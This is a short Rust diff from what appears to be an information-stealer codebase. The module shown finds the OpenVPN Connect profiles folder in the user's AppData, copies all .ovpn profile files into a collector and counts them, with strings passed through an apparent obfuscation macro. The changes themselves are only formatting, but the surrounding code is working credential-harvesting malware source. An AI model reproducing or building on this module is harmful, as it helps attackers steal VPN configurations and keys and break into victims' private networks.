@@ -15,7 +15,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for OpenVPN {
         let profiles = Path::appdata() / s!("OpenVPN Connect") / s!("profiles");
 
         if !StorageFileSystem.is_exists(&profiles) {
-            return
+            return;
         }
 
         if copy_content_with_filter(
@@ -23,8 +23,10 @@ impl<C: Collector, F: FileSystem> Task<C, F> for OpenVPN {
             &profiles,
             filesystem,
             parent,
-            &profile_filter
-        ).is_ok() {
+            &profile_filter,
+        )
+        .is_ok()
+        {
             let count = StorageFileSystem
                 .list_files_filtered(profiles, &profile_filter)
                 .map(|files| files.len())
@@ -36,5 +38,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for OpenVPN {
 }
 
 fn profile_filter(path: &Path) -> bool {
-    path.extension().map(|ex| ex.contains(s!("ovpn"))).unwrap_or(false)
+    path.extension()
+        .map(|ex| ex.contains(s!("ovpn")))
+        .unwrap_or(false)
 }
